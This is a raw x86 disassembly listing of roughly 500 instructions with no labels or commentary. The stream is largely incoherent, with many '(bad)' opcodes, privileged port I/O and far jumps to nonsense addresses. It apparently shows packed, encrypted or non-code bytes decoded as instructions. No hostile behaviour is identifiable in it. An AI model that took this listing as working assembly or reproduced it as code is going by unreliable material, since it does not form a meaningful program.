  41fda7:	mov    dl,0x44
  41fda9:	test   dh,bl
  41fdab:	lods   eax,DWORD PTR ds:[esi]
  41fdac:	push   esp
  41fdad:	jo     0x41fdce
  41fdaf:	sub    bl,BYTE PTR [ebx]
  41fdb1:	fnstsw ax
  41fdb3:	xchg   DWORD PTR [edx+0x72],eax
  41fdb6:	or     al,0x2
  41fdb8:	and    cl,BYTE PTR [ebp-0x6d]
  41fdbb:	add    BYTE PTR [ebx-0x224dffc0],0xf6
  41fdc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdc3:	fwait
  41fdc4:	cmp    eax,0x24938a3d
  41fdc9:	je     0x41fd9c
  41fdcb:	jg     0x41fd7a
  41fdcd:	shl    DWORD PTR [edi],cl
  41fdcf:	(bad)  
  41fdd0:	in     eax,dx
  41fdd1:	xchg   ebp,eax
  41fdd3:	out    0xcf,al
  41fdd5:	push   ebp
  41fdd6:	(bad)  
  41fdd8:	loopne 0x41fe4f
  41fdda:	stos   BYTE PTR es:[edi],al
  41fddb:	xor    esi,edx
  41fddd:	les    eax,FWORD PTR [eax+edx*8+0x237c1775]
  41fde4:	xchg   esi,eax
  41fde5:	rcl    BYTE PTR [ebp+0x622bdcb9],cl
  41fdeb:	aaa    
  41fdec:	cmp    eax,0x67fa6a09
  41fdf1:	pop    edx
  41fdf2:	and    BYTE PTR [ebx-0x2],ch
  41fdf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdf6:	jb     0x41fdf7
  41fdf8:	bound  ebp,QWORD PTR [edx-0x37]
  41fdfb:	xchg   ebx,eax
  41fdfc:	inc    esp
  41fdfd:	into   
  41fdfe:	xor    BYTE PTR [ecx+0x126af58e],al
  41fe04:	rcl    BYTE PTR [edx-0x53c90b42],cl
  41fe0a:	cmp    eax,0xe6b49eba
  41fe0f:	mov    eax,ds:0xb78a73a5
  41fe14:	jmp    0x41fe31
  41fe16:	mov    bl,0x13
  41fe18:	test   eax,0x215a3841
  41fe1d:	cmp    al,0x73
  41fe1f:	out    dx,al
  41fe20:	pop    ds
  41fe21:	or     ch,BYTE PTR [edx-0x694d9d9]
  41fe27:	popf   
  41fe28:	cld    
  41fe29:	sbb    DWORD PTR [ecx],0x53882075
  41fe2f:	lods   eax,DWORD PTR ds:[esi]
  41fe30:	mov    ebx,0xb82bdaa3
  41fe35:	(bad)  
  41fe36:	into   
  41fe37:	xor    edi,DWORD PTR [bx+si-0x3a]
  41fe3b:	mov    al,ds:0x8826fc92
  41fe40:	mov    ds:0xbe9e18c1,eax
  41fe45:	xchg   ebx,eax
  41fe46:	rol    DWORD PTR [ebp-0x48dbaea7],1
  41fe4c:	sub    bl,BYTE PTR [esp+eax*2-0x2144fea4]
  41fe53:	loop   0x41fec0
  41fe55:	int    0x94
  41fe57:	adc    eax,0xc9aefea8
  41fe5c:	jne    0x41fe4e
  41fe5e:	add    BYTE PTR ds:0x44571d3f,bh
  41fe64:	cmp    esi,edx
  41fe66:	out    dx,al
  41fe67:	fwait
  41fe68:	push   esp
  41fe69:	ror    DWORD PTR [ecx-0x392a4138],1
  41fe6f:	dec    esp
  41fe70:	hlt    
  41fe71:	icebp  
  41fe72:	push   es
  41fe73:	pop    ebp
  41fe74:	pusha  
  41fe75:	push   0x18
  41fe77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe78:	jae    0x41fe74
  41fe7a:	or     BYTE PTR [edx-0x250846f1],0x59
  41fe81:	dec    edi
  41fe82:	call   0xbe6f:0x35051dea
  41fe89:	cld    
  41fe8a:	cld    
  41fe8b:	add    al,0x32
  41fe8d:	scas   eax,DWORD PTR es:[edi]
  41fe8e:	add    al,0xdf
  41fe90:	(bad)  
  41fe91:	pop    ecx
  41fe92:	sbb    ecx,DWORD PTR [esi+0x71d249a5]
  41fe98:	add    al,0x18
  41fe9a:	mov    ebx,DWORD PTR [esi]
  41fe9c:	xchg   esi,eax
  41fe9d:	pop    ecx
  41fe9e:	cwde   
  41fe9f:	push   es
  41fea0:	lods   eax,DWORD PTR ds:[esi]
  41fea1:	mov    cl,0x20
  41fea3:	mov    ds:0x4a63688d,eax
  41fea8:	jle    0x41fe86
  41feaa:	pop    ss
  41feab:	cld    
  41feac:	fdivr  QWORD PTR ds:0x1928f447
  41feb2:	(bad)  
  41feb3:	(bad)  
  41feb4:	mov    ebp,0xc00b976a
  41feb9:	jecxz  0x41fede
  41febb:	mov    ds:0x3e2b3d19,al
  41fec0:	dec    ebx
  41fec1:	lea    edi,[ebx+0xfc0d87c]
  41fec7:	stos   DWORD PTR es:[edi],eax
  41fec8:	xor    cl,BYTE PTR [esi+0x15f98e30]
  41fece:	mov    ebp,0x19bd3f46
  41fed3:	fcom   QWORD PTR ds:0x90aa9f65
  41fed9:	sbb    al,0x28
  41fedb:	mov    al,ds:0xbbb5dcd1
  41fee0:	or     DWORD PTR [eax+eiz*8+0x40],esi
  41fee4:	sub    BYTE PTR [eax+0x75],dl
  41fee7:	loope  0x41ff3b
  41fee9:	mov    WORD PTR [edx],gs
  41feeb:	clc    
  41feec:	mov    bl,0x1e
  41feee:	hlt    
  41feef:	test   DWORD PTR [esi-0x2c],ebx
  41fef2:	jno    0x41fe78
  41fef4:	mov    gs,WORD PTR [eax]
  41fef6:	ret    0x27c0
  41fef9:	lock inc eax
  41fefb:	(bad)  
  41fefc:	hlt    
  41fefd:	pop    esi
  41fefe:	pop    ss
  41feff:	shr    ch,cl
  41ff01:	push   ecx
  41ff02:	cmp    ch,ah
  41ff04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff05:	mov    WORD PTR [ecx-0x783dc3f3],?
  41ff0b:	fsub   st(4),st
  41ff0d:	call   0x9ab5:0x7fb62805
  41ff14:	daa    
  41ff15:	leave  
  41ff16:	out    0x41,eax
  41ff18:	add    DWORD PTR [edi+ebp*4-0xf],ecx
  41ff1c:	cmp    esp,DWORD PTR [eax+eax*4-0x24fa9e01]
  41ff23:	sbb    BYTE PTR [esi+0x66],dl
  41ff26:	xchg   ebx,eax
  41ff27:	or     DWORD PTR [esi],edx
  41ff29:	pop    edx
  41ff2a:	(bad)  
  41ff2b:	sbb    DWORD PTR [ecx],eax
  41ff2d:	sbb    ecx,DWORD PTR [esi]
  41ff2f:	out    dx,al
  41ff30:	daa    
  41ff31:	inc    ebx
  41ff32:	cmc    
  41ff33:	inc    esp
  41ff34:	retf   
  41ff35:	or     al,bl
  41ff37:	cdq    
  41ff38:	bnd jo 0x41ff38
  41ff3b:	push   ebp
  41ff3c:	aad    0xb1
  41ff3e:	loopne 0x41ff81
  41ff40:	mov    esi,0x6af3c3db
  41ff45:	cld    
  41ff46:	out    0xb7,eax
  41ff48:	lahf   
  41ff49:	enter  0x60b3,0x12
  41ff4d:	cmp    bl,BYTE PTR [ebx]
  41ff4f:	cmp    cl,dh
  41ff51:	gs cs icebp 
  41ff54:	popf   
  41ff55:	push   es
  41ff56:	scas   al,BYTE PTR es:[edi]
  41ff57:	daa    
  41ff58:	jno    0x41feee
  41ff5a:	xor    al,0x3d
  41ff5c:	sub    edx,DWORD PTR [edi-0x13a34d1c]
  41ff62:	sti    
  41ff63:	fcom   QWORD PTR [eax+0x5]
  41ff66:	gs pop eax
  41ff68:	(bad)  
  41ff69:	pop    edi
  41ff6a:	fs rcl ah,1
  41ff6d:	dec    ecx
  41ff6e:	jne    0x41ffe1
  41ff70:	cmp    DWORD PTR [ecx+0x40e740de],eax
  41ff76:	inc    ecx
  41ff77:	rcl    dh,cl
  41ff79:	dec    ebx
  41ff7a:	setno  dh
  41ff7d:	jne    0x41ff5e
  41ff7f:	push   ds
  41ff80:	les    esp,FWORD PTR cs:[edx+0x413b3f0b]
  41ff87:	repnz loope 0x41ff5e
  41ff8a:	sub    BYTE PTR [ecx-0x5dbc9f61],ah
  41ff90:	(bad)  
  41ff91:	xchg   edi,eax
  41ff92:	(bad)  
  41ff93:	jl     0x41ff7a
  41ff95:	out    dx,eax
  41ff96:	outs   dx,DWORD PTR ds:[esi]
  41ff97:	pop    ecx
  41ff98:	xchg   esi,eax
  41ff99:	int    0x50
  41ff9b:	push   cs
  41ff9c:	jmp    0x1028:0x6430da84
  41ffa3:	hlt    
  41ffa4:	dec    ecx
  41ffa5:	imul   esi,DWORD PTR [esi-0x10],0xf91ffadd
  41ffac:	loop   0x41ff87
  41ffae:	xor    DWORD PTR [esi+eax*4],0x7dc294ce
  41ffb5:	or     BYTE PTR [eax+0x17571f70],dl
  41ffbb:	mov    bh,0x8e
  41ffbd:	pop    ebp
  41ffbe:	pusha  
  41ffbf:	arpl   WORD PTR [ebx+0x3701c1dc],sp
  41ffc5:	das    
  41ffc6:	jno    0x41ff84
  41ffc8:	or     edx,DWORD PTR [eax]
  41ffca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffcb:	xor    DWORD PTR [esi],edx
  41ffcd:	sbb    BYTE PTR [edi+0x73475dfa],0x83
  41ffd4:	aaa    
  41ffd5:	mov    DWORD PTR [esi+edx*1],ebx
  41ffd8:	push   eax
  41ffd9:	push   0xfffffff3
  41ffdb:	dec    DWORD PTR [ebp-0x20]
  41ffde:	jmp    0x6005:0xee7a9660
  41ffe5:	or     DWORD PTR [eax-0x3e],edi
  41ffe8:	mov    ah,0x25
  41ffea:	push   esp
  41ffeb:	sbb    al,0x62
  41ffed:	jge    0x420054
  41ffef:	pop    edx
  41fff0:	xchg   edx,eax
  41fff1:	xor    BYTE PTR [ebp+0x12ce6920],ch
  41fff7:	fwait
  41fff8:	mov    al,ds:0xe4cd7924
  41fffd:	cmp    cl,dh
  41ffff:	jmp    0xc3eb:0x5edfe395
  420006:	pop    es
  420007:	or     BYTE PTR [edi],ah
  420009:	call   ecx
  42000b:	mov    bh,0xd2
  42000d:	ds mov esi,0x87fabb01
  420013:	xor    esi,DWORD PTR ds:0x429066ce
  420019:	push   edx
  42001a:	inc    edx
  42001b:	inc    edi
  42001c:	jae    0x42005a
  42001e:	in     al,dx
  42001f:	jo     0x41ffc9
  420021:	cmp    ebp,esp
  420023:	mov    DWORD PTR [edx-0x66ec8420],esp
  420029:	imul   edx,esp,0x53d841f
  42002f:	dec    eax
  420030:	in     al,0x40
  420032:	pop    ecx
  420033:	cwde   
  420034:	(bad)  
  420035:	(bad)  
  420036:	mov    esi,DWORD PTR [eax+edi*2-0x2b]
  42003a:	test   al,0xb3
  42003c:	jb     0x42006a
  42003e:	call   0xc5efefdb
  420043:	sar    BYTE PTR [ebp-0x78],cl
  420046:	popa   
  420047:	jne    0x4200bd
  420049:	inc    eax
  42004a:	dec    esi
  42004b:	adc    dl,BYTE PTR [ebx-0x5b]
  42004e:	mov    al,0x6b
  420050:	and    edi,DWORD PTR [ebp+ecx*2-0x41be8f45]
  420057:	ret    
  420058:	jo     0x420000
  42005a:	xchg   esi,eax
  42005b:	dec    DWORD PTR [ebx-0x14295128]
  420061:	popa   
  420062:	mov    esp,0x33ab44f3
  420067:	bound  ecx,QWORD PTR [esi]
  420069:	rcl    BYTE PTR [edx-0x57],1
  42006c:	xchg   edi,eax
  42006d:	inc    edi
  42006e:	mov    bl,0x2f
  420070:	nop
  420071:	fnstenv [edx-0x61]
  420074:	adc    DWORD PTR [edx+0x54baa58f],ecx
  42007a:	in     eax,dx
  42007b:	and    ah,BYTE PTR [edi+esi*2+0x8]
  42007f:	mov    BYTE PTR [ebp-0x31],bl
  420082:	and    DWORD PTR [edi],esp
  420084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420085:	stos   BYTE PTR es:[edi],al
  420086:	bound  ebp,QWORD PTR ds:0xc40ab2b4
  42008c:	jbe    0x420058
  42008e:	js     0x42001d
  420090:	hlt    
  420091:	pop    ebp
  420092:	std    
  420093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420094:	imul   ecx,DWORD PTR [ebp-0x62],0x88606920
  42009b:	push   ds
  42009c:	test   BYTE PTR [ecx+0x1f2cce0f],0xee
  4200a3:	call   0x924a2248
  4200a8:	mov    ecx,0x89e7d1e5
  4200ad:	lds    eax,FWORD PTR ds:0xb3740a91
  4200b3:	fstp   QWORD PTR [ecx]
  4200b5:	jge    0x4200b2
  4200b7:	pop    ebx
  4200b8:	mov    ?,esp
  4200ba:	sub    cl,dh
  4200bc:	xchg   ebp,eax
  4200bd:	ret    
  4200be:	int    0x84
  4200c0:	fs inc edi
  4200c2:	cmp    eax,0x6953df9e
  4200c7:	jnp    0x420137
  4200c9:	mov    eax,ds:0xf189e25d
  4200ce:	sbb    esp,DWORD PTR [esi+0x7d]
  4200d1:	add    DWORD PTR [edi-0x6e],esi
  4200d4:	pop    es
  4200d5:	imul   ebx,DWORD PTR [ecx+0x0],0x267f1c91
  4200dc:	pop    ecx
  4200dd:	dec    esp
  4200de:	or     ah,BYTE PTR [esi+0x57282f88]
  4200e4:	loope  0x42011d
  4200e6:	xor    dh,BYTE PTR [edi+0xd]
  4200e9:	inc    eax
  4200ea:	dec    ebx
  4200eb:	je     0x4200ac
  4200ed:	aas    
  4200ee:	sahf   
  4200ef:	jg     0x4200f7
  4200f1:	mov    ds:0x91ce8391,al
  4200f6:	or     BYTE PTR [ebp-0x67],ch
  4200f9:	call   0x7fe998e3
  4200fe:	sub    edx,edi
  420100:	pop    es
  420101:	inc    ebp
  420102:	jno    0x4200c7
  420104:	repz jns 0x4200a7
  420107:	(bad)  
  420109:	gs and ax,sp
  42010d:	clc    
  42010e:	(bad)  
  42010f:	outs   dx,BYTE PTR ds:[esi]
  420110:	mov    edx,0x1dab3662
  420115:	fsubr  st,st(1)
  420117:	jbe    0x42017b
  420119:	jge    0x420129
  42011b:	daa    
  42011c:	das    
  42011d:	outs   dx,BYTE PTR ds:[esi]
  42011e:	jl     0x420118
  420120:	cmp    dl,BYTE PTR [edi]
  420122:	pop    es
  420123:	inc    ecx
  420124:	shl    BYTE PTR [esp+ebx*8+0x22],cl
  420128:	sbb    ebx,ebx
  42012a:	adc    ebx,esp
  42012c:	scas   eax,DWORD PTR es:[edi]
  42012d:	sti    
  42012e:	dec    ebp
  42012f:	or     DWORD PTR [ebp+0x5a],eax
  420132:	jno    0x420150
  420134:	sub    ah,cl
  420136:	lea    edx,[esi+0x5ce596a2]
  42013c:	mov    bl,0x73
  42013e:	into   
  42013f:	xlat   BYTE PTR ds:[ebx]
  420140:	jl     0x420157
  420142:	jg     0x42019a
  420144:	fidiv  WORD PTR [ebp+0x396fb8f2]
  42014a:	mov    al,0x5b
  42014c:	xrelease xchg BYTE PTR cs:[edi+0x40],ch
  420151:	adc    BYTE PTR [ebx+ecx*8-0x30a1b092],bl
  420158:	jo     0x42012d
  42015a:	and    DWORD PTR [ecx+0x17],0xe2893be4
  420161:	leave  
  420162:	pop    DWORD PTR [ebp-0x171ee442]
  420168:	jg     0x42011c
  42016a:	jne    0x4201c6
  42016c:	xchg   ecx,eax
  42016d:	or     eax,0xddadd5b7
  420172:	cmc    
  420173:	ins    BYTE PTR es:[edi],dx
  420174:	jg     0x4201a2
  420176:	pop    ss
  420177:	cdq    
  420178:	ins    BYTE PTR es:[edi],dx
  420179:	pushf  
  42017a:	es push es
  42017c:	pop    eax
  42017d:	outs   dx,DWORD PTR ds:[esi]
  42017e:	xchg   ebx,eax
  42017f:	jl     0x4201e8
  420181:	popa   
  420182:	in     eax,0xbf
  420184:	out    dx,eax
  420185:	sub    bl,BYTE PTR [edx+0x16]
  420188:	push   cs
  420189:	sub    al,0x87
  42018b:	xchg   edx,eax
  42018c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42018d:	sbb    DWORD PTR [ecx-0x17],eax
  420190:	popf   
  420191:	inc    eax
  420192:	data16 bnd jg 0x42017e
  420196:	push   ds
  420197:	xlat   BYTE PTR ds:[ebx]
  420198:	lods   al,BYTE PTR ds:[esi]
  420199:	pop    edi
  42019a:	pusha  
  42019b:	dec    eax
  42019c:	out    dx,eax
  42019d:	adc    al,0xe2
  42019f:	or     eax,0x5a77da83
  4201a4:	icebp  
  4201a5:	jecxz  0x42015d
  4201a7:	pop    edi
  4201a8:	sahf   
  4201a9:	cmp    DWORD PTR [ecx+0x4ee8584],0x3f04d4a5
  4201b3:	mov    BYTE PTR [ecx],0x5c
  4201b6:	lea    esi,[edi]
  4201b8:	xor    al,0x7f
  4201ba:	or     DWORD PTR [edi-0x19],0x37799bd1
  4201c1:	cli    
  4201c2:	mov    bl,0x8b
  4201c4:	aas    
  4201c5:	push   ecx
  4201c6:	popa   
  4201c7:	daa    
  4201c8:	enter  0xf7b9,0x41
  4201cc:	dec    ecx
  4201cd:	outs   dx,DWORD PTR ds:[esi]
  4201ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201cf:	fisubr DWORD PTR [ebx-0x60]
  4201d2:	sub    al,0x29
  4201d4:	cmp    eax,0xcffa6ea9
  4201d9:	adc    eax,0x3726c299
  4201de:	inc    edx
  4201df:	adc    eax,0x72496e54
  4201e4:	push   ds
  4201e5:	call   0x5470f294
  4201ea:	cmp    BYTE PTR [edi-0x63],dh
  4201ed:	lods   al,BYTE PTR ds:[esi]
  4201ee:	jecxz  0x420189
  4201f0:	inc    esi
  4201f1:	ja     0x42018b
  4201f3:	in     al,0x38
  4201f5:	fisub  DWORD PTR [ebx]
  4201f7:	pop    ebp
  4201f8:	inc    eax
  4201f9:	test   eax,0xa0840321
  4201fe:	xchg   edi,eax
  4201ff:	aas    
  420200:	xchg   BYTE PTR [ebp+0x33d12bfe],dh
  420206:	div    ch
  420208:	jp     0x420215
  42020a:	std    
  42020b:	sub    bh,BYTE PTR [eax-0x68]
  42020e:	cmp    BYTE PTR [ebx+0x1a],0x79
  420212:	retf   0x9eb3
  420215:	test   eax,0xa7068c0f
  42021a:	gs out 0x95,eax
  42021d:	push   0x8b73b79b
  420222:	sbb    BYTE PTR [edx],bl
  420224:	jle    0x4201bd
  420226:	mov    cl,0x65
  420228:	cmp    esp,DWORD PTR [eax]
  42022a:	mov    cl,0x3a
  42022c:	push   edi
  42022d:	sub    DWORD PTR [ebp-0x78ccb069],ebp
  420233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420234:	jp     0x4202a2
  420236:	shl    BYTE PTR [esi+edi*1],cl
  420239:	out    dx,eax
  42023a:	pop    eax
  42023b:	pop    edx
  42023c:	fild   WORD PTR [esi-0x6]
  42023f:	cld    
  420240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420241:	sub    dh,dh
  420243:	loop   0x4201f8
  420245:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  420247:	mov    esi,0x2f64bad5
  42024c:	scas   al,BYTE PTR es:[edi]
  42024d:	dec    ecx
  42024e:	pop    ebp
  42024f:	pop    ss
  420250:	push   eax
  420251:	ss inc esp
  420253:	loope  0x4202d2
  420255:	ds xchg esp,eax
  420257:	fcomp  QWORD PTR [edx+eax*4]
  42025a:	mov    esi,0x91a002aa
  42025f:	gs jo  0x420203
  420262:	mov    DWORD PTR [esp+edi*8],eax
  420265:	scas   al,BYTE PTR es:[edi]
  420266:	sub    edx,ecx
  420268:	data16 adc dl,BYTE PTR [ecx-0x149434a3]
  42026f:	jo     0x4202a4
  420271:	dec    esp
  420272:	fisub  DWORD PTR [edi+0x6cee1b4a]
  420278:	jl     0x42027a
  42027a:	or     DWORD PTR [edi],0xfffffff3
  42027d:	mov    dl,0x39
  42027f:	or     esp,DWORD PTR [ebp+0x2f]
  420282:	jae    0x42026e
  420284:	aas    
  420285:	xchg   esp,eax
  420286:	pop    esi
  420287:	scas   eax,DWORD PTR es:[edi]
  420288:	rol    DWORD PTR [esi],0xc3
  42028b:	adc    al,0xb2
  42028d:	cmp    BYTE PTR [ecx+0x24],0x6a
  420291:	mov    edx,0xc4ef61ee
  420296:	loopne 0x420245
  420298:	outs   dx,DWORD PTR ds:[esi]
  420299:	pop    eax
  42029a:	or     DWORD PTR [edi],0xffffffd3
  42029d:	fst    DWORD PTR [ebx+0x3c]
  4202a0:	lss    ebp,FWORD PTR [edi]
  4202a3:	xchg   edi,eax
  4202a4:	and    bh,al
  4202a6:	leave  
  4202a7:	xchg   ebp,eax
  4202a8:	inc    ebp
  4202a9:	dec    eax
  4202aa:	push   esi
  4202ab:	add    cl,dl
  4202ad:	jmp    0x8a44429a
  4202b2:	xor    BYTE PTR [eax],dh
  4202b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202b5:	cmp    ah,dl
  4202b7:	and    DWORD PTR [ebx+0x1211f0ca],edi
  4202bd:	xchg   ecx,eax
  4202be:	mov    esp,0x13be533e
  4202c3:	sahf   
  4202c4:	adc    al,dl
  4202c6:	dec    edx
  4202c7:	xchg   edi,eax
  4202c8:	pop    ebp
  4202c9:	daa    
  4202ca:	pop    edi
  4202cb:	pop    edx
  4202cc:	push   0xffffff9b
  4202ce:	sub    BYTE PTR [eax],dl
  4202d0:	mov    ds,WORD PTR [edx+0x65]
  4202d3:	adc    edx,ecx
  4202d5:	push   es
  4202d6:	adc    bh,BYTE PTR [ebp+edi*2-0x188cf9d1]
  4202dd:	gs xchg ebp,eax
  4202df:	add    esi,esi
  4202e1:	pop    ebx
  4202e2:	push   es
  4202e3:	fwait
  4202e4:	aas    
  4202e5:	repz or eax,0xcf159272
  4202eb:	imul   ebx,edi,0x7c
  4202ee:	inc    DWORD PTR [ebx+edi*2]
  4202f1:	jnp    0x4202a4
  4202f3:	push   0x9bd25ec4
  4202f8:	fadd   QWORD PTR [edi-0x2e]
  4202fb:	inc    edi
  4202fc:	mov    edi,0x3f30e742
  420301:	jl     0x420309
  420303:	out    0x93,eax
  420305:	pop    ds
  420306:	dec    ecx
  420307:	leave  
  420308:	shl    DWORD PTR [ebp-0x13bf2567],cl
  42030e:	add    esi,DWORD PTR [esp+esi*8-0x3e]
  420312:	dec    ecx
  420313:	jge    0x42029b
  420315:	sbb    edx,DWORD PTR [ebp-0x79]
  420318:	dec    esp
  420319:	(bad)  
  42031a:	sbb    BYTE PTR [ebx+0x71],ah
  42031d:	stos   DWORD PTR es:[edi],eax
  42031e:	add    dl,0xb0
  420321:	daa    
  420322:	arpl   ax,bx
  420324:	sub    DWORD PTR [edi-0x584efb03],edx
  42032a:	or     DWORD PTR [ebp-0x59b058cb],0x23
  420331:	adc    DWORD PTR [ecx+ecx*8-0x68],esp
  420335:	jl     0x42031c
  420337:	es add eax,0xd4e62252
  42033d:	jle    0x420348
  42033f:	mov    esp,0x2a23bc28
  420344:	(bad)
  420349:	repz js 0x42036b
  42034c:	ins    BYTE PTR es:[edi],dx
  42034d:	cmp    bl,BYTE PTR [ebx]
  42034f:	xchg   esp,eax
  420350:	(bad)  
  420351:	mul    esi
  420353:	repz shl BYTE PTR [esi],cl
  420356:	mov    WORD PTR [edi-0x5bded464],fs
  42035c:	jb     0x420382
  42035e:	mov    bh,0x77
  420360:	inc    ebx
  420361:	sub    eax,0x685e3a58
  420366:	aam    0x68
  420368:	or     al,0x21
  42036a:	lods   eax,DWORD PTR ds:[esi]
  42036b:	outs   dx,BYTE PTR ds:[esi]
  42036c:	mov    dl,0xbf
  42036e:	adc    BYTE PTR [ecx],ch
  420370:	aaa    
  420371:	lods   al,BYTE PTR ds:[esi]
  420372:	retf   
  420373:	repnz sar DWORD PTR [esi-0x2f7004b4],0x9
  42037b:	es je  0x420354
  42037e:	(bad)  
  420380:	jmp    0x6971:0x634fc76d
  420387:	adc    al,0xe5
  420389:	out    0x1d,al
  42038b:	push   edi
  42038c:	mov    esi,0x2f6313f2
  420391:	or     esp,ebp
  420393:	(bad)  
  420394:	jge    0x4203ca
  420396:	lods   al,BYTE PTR ds:[esi]
  420397:	or     eax,0xe210c666
  42039c:	sub    ebp,ebp
  42039e:	xor    al,0xb2
  4203a0:	mov    ds:0xc193e7e5,al
  4203a5:	or     BYTE PTR [ecx],ah
  4203a7:	ss jo  0x42038d
  4203aa:	es push esp
  4203ac:	sbb    al,0x32
  4203ae:	xchg   dl,bl
  4203b0:	mov    ah,bl
  4203b2:	test   BYTE PTR [eax-0x1f],dh
  4203b5:	push   ss
  4203b6:	scas   eax,DWORD PTR es:[edi]
  4203b7:	arpl   WORD PTR [ecx-0x445ebc19],di
  4203bd:	adc    DWORD PTR [esi+0x5c],ebx
  4203c0:	jg     0x420370
  4203c2:	int    0x2
  4203c4:	inc    DWORD PTR [eax]
  4203c6:	retf   
  4203c7:	mov    edx,0xcc50c3d8
  4203cc:	sti    
  4203cd:	stos   DWORD PTR es:[edi],eax
  4203ce:	ret    0x981b
  4203d1:	pop    esi
  4203d2:	loop   0x4203d1
  4203d4:	jl     0x4203ce
  4203d6:	mov    al,BYTE PTR [edx+0x9257467]
  4203dc:	ja     0x420433
  4203de:	daa    
  4203df:	data16 and al,0x64
  4203e2:	out    dx,al
  4203e3:	mov    cl,0xbf
  4203e5:	popa   
  4203e6:	push   esi
  4203e7:	or     ebx,DWORD PTR [ecx+0x21eefbfc]
  4203ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203ee:	pop    edi
  4203ef:	cs js  0x4203f2
  4203f2:	rcr    DWORD PTR [edx-0x22b3a922],0x10
  4203f9:	push   esi
  4203fa:	sbb    cx,ax
  4203fd:	sbb    al,0x3
  4203ff:	(bad)  
  420400:	in     eax,0xfb
  420402:	aad    0x89
  420404:	inc    ecx
  420405:	sbb    al,0x8f
  420407:	inc    dh
  420409:	mov    WORD PTR [eax+0x10],?
  42040c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42040d:	pushf  
  42040e:	xchg   ecx,eax
  42040f:	pop    es
  420410:	dec    esp
  420411:	dec    ebx
  420412:	mov    bh,0x71
  420414:	repz cs push esi
  420417:	push   esi
  420418:	stos   BYTE PTR es:[edi],al
  420419:	push   ebx
  42041a:	xchg   edi,eax
  42041b:	xchg   ebx,eax
  42041c:	data16 jno 0x42040e
  42041f:	les    ebp,FWORD PTR [eax-0x5b]
  420422:	mov    esi,0x83f1ddf3
  420427:	clc    
  420428:	sbb    al,0x7b
  42042a:	push   ebx
  42042b:	retf   0xfd7e
  42042e:	loopne 0x420454
  420430:	(bad)  
  420431:	pop    esp
  420432:	out    dx,al
  420433:	pop    ss
  420434:	or     eax,0xbc7d06d
  420439:	int    0xca
  42043b:	dec    edx
  42043c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42043d:	mov    ch,0xf9
  42043f:	adc    eax,0x7f3d6c83
  420444:	mov    ?,WORD PTR [edx+0x16c29a2f]
  42044a:	jp     0x4203ef
  42044c:	popf   
  42044d:	or     DWORD PTR [ebx],edx
  42044f:	mov    dh,0x70
  420451:	lods   eax,DWORD PTR ds:[esi]
  420452:	out    0x4a,al
  420454:	xlat   BYTE PTR ds:[ebx]
  420455:	fild   WORD PTR [ebp+0xb]
  420458:	adc    eax,0xe9cb4c5
  42045d:	pop    edx
  42045e:	adc    ch,BYTE PTR [ebx-0x497a9473]
  420464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420465:	ds ret 0x2bf1
  420469:	add    eax,0xa39a53fc
  42046e:	mov    bl,0xa1
  420470:	adc    eax,0x5f609c8e
  420475:	scas   eax,DWORD PTR es:[edi]
  420476:	fst    QWORD PTR [esp+ebx*4]
  420479:	push   ss
  42047a:	inc    ebp
  42047b:	push   ebp
  42047c:	retf   0x9503
  42047f:	sbb    DWORD PTR [edi],ebx
  420481:	and    ch,cl
  420483:	scas   eax,DWORD PTR es:[edi]
  420484:	(bad)  
  420485:	mov    edi,0xb7b7c9b4
  42048a:	in     al,dx
  42048b:	jg     0x420500
  42048d:	adc    al,BYTE PTR [ebp+0x5d96a8b9]
  420493:	jecxz  0x420446
  420495:	dec    ebp
  420496:	cmp    eax,0x50a8389a
  42049b:	scas   al,BYTE PTR es:[edi]
  42049c:	pop    esp
  42049d:	retf   0x2352
  4204a0:	jmp    0x42047c
  4204a2:	call   0x37d0:0x77089cf7
  4204a9:	cmp    bl,BYTE PTR ds:0x433dbcb0
  4204af:	lods   al,BYTE PTR ds:[esi]
  4204b0:	or     DWORD PTR [edi+eiz*8+0x65],edx
  4204b4:	xchg   ecx,eax
  4204b5:	pop    ebp
  4204b6:	or     edx,ebx
  4204b8:	pop    edi
  4204b9:	xor    esi,DWORD PTR [esi-0x19ef1744]
  4204bf:	adc    esi,esi
  4204c1:	stos   DWORD PTR es:[edi],eax
  4204c2:	mov    ebp,0xaf956c7a
  4204c7:	ds xchg edi,eax
  4204c9:	adc    eax,0x71d31380
  4204ce:	dec    esp
  4204cf:	popa   
  4204d0:	add    ah,cl
  4204d2:	cmp    edi,DWORD PTR [esi-0x55635801]
  4204d8:	xor    al,0xb0
  4204da:	push   ds
  4204db:	aad    0x72
  4204dd:	dec    ebp
  4204de:	sar    DWORD PTR [esi],cl
  4204e0:	lods   al,BYTE PTR cs:[esi]
  4204e2:	mov    edi,0x69ac176a
  4204e7:	jo     0x4204a3
  4204e9:	xchg   ecx,eax
  4204ea:	fistp  DWORD PTR [edx+0x135b62d3]
  4204f0:	imul   ecx,DWORD PTR [edx+0x23],0x9
  4204f4:	shl    BYTE PTR [esi],0x4d
  4204f7:	push   esi
  4204f8:	mov    dh,0x29
  4204fa:	scas   eax,DWORD PTR es:[edi]
  4204fb:	pop    eax
  4204fc:	xchg   ebx,eax
  4204fd:	test   ch,ah
  4204ff:	pop    ebp
  420500:	mov    al,ds:0xfc5c1e2a
  420505:	jne    0x420524
  420507:	cmp    eax,0x30ffb6a
  42050c:	cmp    eax,DWORD PTR [ecx+edi*2]
  42050f:	dec    DWORD PTR [ebx+0x7f204010]
